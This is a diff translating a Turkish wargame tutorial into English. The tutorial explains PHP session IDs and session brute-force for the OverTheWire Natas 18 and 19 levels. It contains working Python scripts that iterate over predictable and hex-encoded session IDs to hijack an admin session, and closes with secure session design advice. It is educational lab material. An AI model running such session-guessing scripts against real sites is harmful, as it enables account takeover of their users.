@@ -1,60 +1,60 @@
-# 🌐 Web Güvenliği — Session Brute-Force
+# 🌐 Web Security — Session Brute-Force
 
-> Sunucu her kullanıcıya bir session ID verir ve "sen kimsin?" diye sorarken
-> bu ID'ye bakar. Peki ID tahmin edilebilirse?
+> The server gives each user a session ID and, when asking "who are you?",
+> looks at this ID. But what if the ID is guessable?
 
 ---
 
-## 📋 İçindekiler
+## 📋 Table of Contents
 
-- [Session Nedir?](#session-nedir)
-- [PHPSESSID Nasıl Çalışır?](#phpsessid-nasıl-çalışır)
-- [Tahmin Edilebilir Session ID](#tahmin-edilebilir-session-id)
+- [What Is a Session?](#what-is-a-session)
+- [How Does PHPSESSID Work?](#how-does-phpsessid-work)
+- [Predictable Session ID](#predictable-session-id)
 - [Session Brute-Force](#session-brute-force)
-- [Natas'ta Kullanım](#natasta-kullanım)
+- [Usage in Natas](#usage-in-natas)
 
 ---
 
-## Session Nedir?
+## What Is a Session?
 
-HTTP stateless'tır — sunucu her isteği bağımsız değerlendirir. Session mekanizması bu sorunu çözer:
-
-```
-1. Kullanıcı giriş yapar
-2. Sunucu rastgele bir session ID üretir
-3. Bu ID cookie olarak tarayıcıya verilir: Set-Cookie: PHPSESSID=abc123
-4. Kullanıcı her istekte bu ID'yi gönderir: Cookie: PHPSESSID=abc123
-5. Sunucu ID'ye bakarak "bu kullanıcı giriş yapmış" der
-```
-
-Session verisi **sunucuda** saklanır (dosya, veritabanı, memory). Cookie sadece anahtarı taşır.
+HTTP is stateless — the server evaluates each request independently. The session mechanism solves this problem:
 
 ```
-Tarayıcı                    Sunucu
-  PHPSESSID=abc123   →      /tmp/sess_abc123 dosyasına bak
+1. The user logs in
+2. The server generates a random session ID
+3. This ID is given to the browser as a cookie: Set-Cookie: PHPSESSID=abc123
+4. The user sends this ID with every request: Cookie: PHPSESSID=abc123
+5. The server looks at the ID and says "this user is logged in"
+```
+
+The session data is stored **on the server** (file, database, memory). The cookie only carries the key.
+
+```
+Browser                     Server
+  PHPSESSID=abc123   →       look at the file /tmp/sess_abc123
                             username=admin
                             isloggedin=true
 ```
 
 ---
 
-## PHPSESSID Nasıl Çalışır?
+## How Does PHPSESSID Work?
 
-PHP varsayılan olarak session ID'leri `/tmp/sess_[ID]` şeklinde dosyalarda saklar.
+By default, PHP stores session IDs in files in the form `/tmp/sess_[ID]`.
 
 ```php
-session_start();                    // Session başlat
-$_SESSION['user'] = 'admin';        // Session'a veri yaz
-echo session_id();                  // Mevcut session ID'yi göster
+session_start();                    // Start the session
+$_SESSION['user'] = 'admin';        // Write data to the session
+echo session_id();                  // Show the current session ID
 ```
 
-Güvenli bir session ID şöyle görünür:
+A secure session ID looks like this:
 
 ```
-PHPSESSID=4f3c2b1a9e8d7f6a5b4c3d2e1f0a9b8c   ← 128-bit rastgele
+PHPSESSID=4f3c2b1a9e8d7f6a5b4c3d2e1f0a9b8c   ← 128-bit random
 ```
 
-Güvensiz (tahmin edilebilir):
+Insecure (predictable):
 
 ```
 PHPSESSID=1
@@ -65,14 +65,14 @@ PHPSESSID=admin1
 
 ---
 
-## Tahmin Edilebilir Session ID
+## Predictable Session ID
 
-Natas 18 ve 19'da session ID'ler tahmin edilebilir aralıktadır.
+In Natas 18 and 19, the session IDs are in a guessable range.
 
-### Natas 18 — Sıralı Sayısal ID
+### Natas 18 — Sequential Numeric ID
 
 ```php
-$maxid = 640;   // Maksimum session ID
+$maxid = 640;   // Maximum session ID
 
 function isValidAdminLogin() {
     if($_REQUEST["username"] == "admin") {
@@ -81,7 +81,7 @@ function isValidAdminLogin() {
     return 0;
 }
 
-session_id(my_session_id());   // Özel session ID atama
+session_id(my_session_id());   // Assign a custom session ID
 session_start();
 
 if(isValidAdminLogin()) {
@@ -89,18 +89,18 @@ if(isValidAdminLogin()) {
 }
 ```
 
-Session ID 1 ile 640 arasında. Admin herhangi bir zamanda giriş yapmışsa, o session hâlâ aktif olabilir.
+The session ID is between 1 and 640. If admin has logged in at any time, that session may still be active.
 
-### Natas 19 — Encode Edilmiş ID
+### Natas 19 — Encoded ID
 
 ```
 Normal:   PHPSESSID=1
-Natas 19: PHPSESSID=3135352d61646d696e   ← hex encode edilmiş "155-admin"
+Natas 19: PHPSESSID=3135352d61646d696e   ← hex-encoded "155-admin"
 ```
 
-Format: `[sayı]-[kullanıcıadı]` → hex encode
+Format: `[number]-[username]` → hex encode
 
-`admin` kullanıcısı için denenmesi gereken ID'ler:
+The IDs to try for the `admin` user:
 ```
 1-admin   → hex → 312d61646d696e
 2-admin   → hex → 322d61646d696e
@@ -112,26 +112,26 @@ Format: `[sayı]-[kullanıcıadı]` → hex encode
 
 ## Session Brute-Force
 
-Tüm olası session ID'lerini deneyerek geçerli bir admin session'ı bulmak.
+Trying all possible session IDs to find a valid admin session.
 
-### Temel Mantık
+### Basic Logic
 
 ```python
 for session_id in range(1, 641):
     response = requests.get(url, cookies={"PHPSESSID": str(session_id)}, auth=...)
-    if "Password" in response.text:   # admin session bulundu
+    if "Password" in response.text:   # admin session found
         print(f"Admin session ID: {session_id}")
         break
 ```
 
-### Natas 18 için Python
+### Python for Natas 18
 
 ```python
 import requests
 
 url      = "http://natas18.natas.labs.overthewire.org/"
 username = "natas18"
-password = "[natas18_şifresi]"
+password = "[natas18_password]"
 
 for session_id in range(1, 641):
     r = requests.get(
@@ -140,22 +140,22 @@ for session_id in range(1, 641):
         auth=(username, password)
     )
     if "You are an admin" in r.text:
-        print(f"[✓] Admin session ID bulundu: {session_id}")
+        print(f"[✓] Admin session ID found: {session_id}")
         print(r.text)
         break
 
     if session_id % 50 == 0:
-        print(f"[*] {session_id}/640 denendi...")
+        print(f"[*] Tried {session_id}/640...")
 ```
 
-### Natas 19 için Python
+### Python for Natas 19
 
 ```python
 import requests
 
 url      = "http://natas19.natas.labs.overthewire.org/"
 username = "natas19"
-password = "[natas19_şifresi]"
+password = "[natas19_password]"
 
 for i in range(1, 641):
     # "i-admin" → hex encode
@@ -168,21 +168,21 @@ for i in range(1, 641):
         auth=(username, password)
     )
     if "You are an admin" in r.text:
-        print(f"[✓] Bulundu! ID: {i}-admin → {hex_id}")
+        print(f"[✓] Found! ID: {i}-admin → {hex_id}")
         print(r.text)
         break
 
     if i % 50 == 0:
-        print(f"[*] {i}/640 denendi...")
+        print(f"[*] Tried {i}/640...")
 ```
 
 ---
 
-## Natas'ta Kullanım
+## Usage in Natas
 
-### Natas 18 — Sıralı PHPSESSID
+### Natas 18 — Sequential PHPSESSID
 
-**Kaynak kod (özet):**
+**Source code (summary):**
 
 ```php
 $maxid = 640;
@@ -192,43 +192,43 @@ function isValidAdminLogin() {
     return 0;
 }
 
-my_session_id() → 1 ile 640 arasında rastgele sayı seçiyor
+my_session_id() → picks a random number between 1 and 640
 ```
 
-**Exploit:** 1-640 arasındaki tüm session ID'leri dene. Herhangi birinde admin session varsa "You are an admin" mesajı gelir.
+**Exploit:** Try all session IDs between 1-640. If any of them has an admin session, the "You are an admin" message appears.
 
 ---
 
 ### Natas 19 — Hex Encoded Session ID
 
-**Gözlem:** Cookie değeri hex görünüyor.
+**Observation:** The cookie value looks like hex.
 
 ```bash
-# Cookie decode et
+# Decode the cookie
 echo "3331322d61646d696e" | xxd -r -p
 # 312-admin
 ```
 
-Format: `[sayı]-[kullanıcı]` hex encoded.
+Format: `[number]-[user]` hex encoded.
 
-**Exploit:** `1-admin` ile `640-admin` arasındaki tüm kombinasyonları hex'e çevirip dene.
+**Exploit:** Convert all combinations between `1-admin` and `640-admin` to hex and try them.
 
 ---
 
-### Session Güvenliği — Doğru Yaklaşım
+### Session Security — The Right Approach
 
 ```
-Güvensiz ✗                    Güvenli ✓
+Insecure ✗                    Secure ✓
 ─────────────────────         ──────────────────────────
-PHPSESSID=1,2,3...            Kriptografik rastgele ID
-PHPSESSID=[kullanıcı_adı]     Opaque token (anlamsız)
-Kısa/tahmin edilebilir        128+ bit entropi
-Sonsuz geçerli               Süre sınırı + logout'ta sil
+PHPSESSID=1,2,3...            Cryptographically random ID
+PHPSESSID=[username]          Opaque token (meaningless)
+Short/predictable            128+ bits of entropy
+Valid forever                Time limit + delete on logout
 ```
 
 ---
 
-## 🔗 Kaynaklar
+## 🔗 Resources
 
 - [PortSwigger — Session Hijacking](https://portswigger.net/web-security/authentication/other-mechanisms)
 - [OWASP — Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
@@ -236,7 +236,7 @@ Sonsuz geçerli               Süre sınırı + logout'ta sil
 
 ---
 
-**Önceki konu:** [13_command_injection_ileri.md](./13_command_injection_ileri.md)
-**Sonraki konu:** [15_session_ve_newline_injection.md](./15_session_ve_newline_injection.md)
+**Previous topic:** [13_command_injection_advanced.md](./13_command_injection_advanced.md)
+**Next topic:** [15_session_and_newline_injection.md](./15_session_and_newline_injection.md)
 
-*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
+*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
